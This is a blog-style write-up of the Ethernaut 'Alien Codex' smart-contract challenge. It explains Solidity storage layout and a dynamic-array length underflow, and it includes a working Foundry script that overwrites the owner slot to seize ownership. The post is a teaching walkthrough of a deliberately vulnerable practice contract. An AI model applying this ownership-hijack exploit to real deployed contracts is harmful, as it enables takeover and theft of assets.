---
layout: post
title: "[Ethernaut] Alien Codex"
tags: blockchain ethernaut foundry bytes dynamicArray underflow slot 
---

# Analysis

---

The goal is

1. Claim ownership

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "../helpers/Ownable-05.sol";

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}

```

When first analyzing the AlienCodex contract, the `record()`, `retract()`, and `revise()` functions are **wrapped by** the `contacted()` modifier. 

Therefore, we must call the `makeContact()` function first to set the `contact` variable to `true`.

```solidity
pragma solidity ^0.5.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() internal {
        _owner = msg.sender;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(isOwner(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns true if the caller is the current owner.
     */
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * > Note: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
```

Next, this contract is an **Ownable** contract that the AlienCodex contract inherits from. We need to overwrite the `_owner` variable in this contract.

According to the [Solidity documentation](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#storage-layout), we find that the `_owner` variable in the **Ownable** contract is stored at a lower storage slot than the `contact` and `codex` variables in the AlienCodex contract.

The `_owner` and `contact` variables are stored together in slot `0` because the combined size of these two variables does not exceed 32 bytes, **and** the `codex` variable is stored separately in slot `1`.

To understand how the dynamic `bytes` array `codex` stores its data, we can refer to the [Solidity documentation](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#bytes-and-string):

> 💡 `bytes` and `string` are encoded identically. In general, the encoding is similar to `bytes1[]`, in the sense that there is a slot for the array itself and a data area that is computed using a `keccak256` hash of that slot’s position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.
>
>In particular: if the data is at most `31` bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value `length * 2`. For byte arrays that store data which is `32` or more bytes long, the main slot `p` stores `length * 2 + 1` and the data is stored as usual in `keccak256(p)`. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).

When we call the `retract()` function, the `codex` array’s length underflows from `0` to `2^256 - 1`.

After this underflow, we can overwrite any storage slot by using the `revise()` function.

When the `i` argument is provided to `revise()`, the function computes `keccak256(abi.encode(0x1)) + i`.

If we set this equal to `0`, we can overwrite the `_owner` variable in slot `0`.

> 💡 Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot `0`

# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.2;

import "forge-std/Script.sol";

interface AlienCodex {
    function owner() external view returns (address);
    function contact() external returns (bool);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexSol is Script{
    AlienCodex public ac_ = AlienCodex(0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7);

    function run() external {
        vm.startBroadcast();
        
        console.log("Before Owner: ", ac_.owner());
        ac_.makeContact();
        ac_.retract();
        ac_.revise(~(uint256(keccak256(abi.encode(0x1)))) + 1, bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS")))));
        console.log("After Owner: ", ac_.owner());

        vm.stopBroadcast();
    }
}
```

`~uint256(keccak256(abi.encode(0x1))) + 1` represents the two’s complement of `keccak256(abi.encode(0x1))`.

Therefore, when we use this value as the `i` argument in the `revise()` function, adding `keccak256(abi.encode(0x1))` and `~uint256(keccak256(abi.encode(0x1))) + 1` results in `0`.

This allows us to attach the `_owner` variable in storage slot `0`.

![image.png]({{site.url}}/images/2025-06-02-AlienCodex/result.png)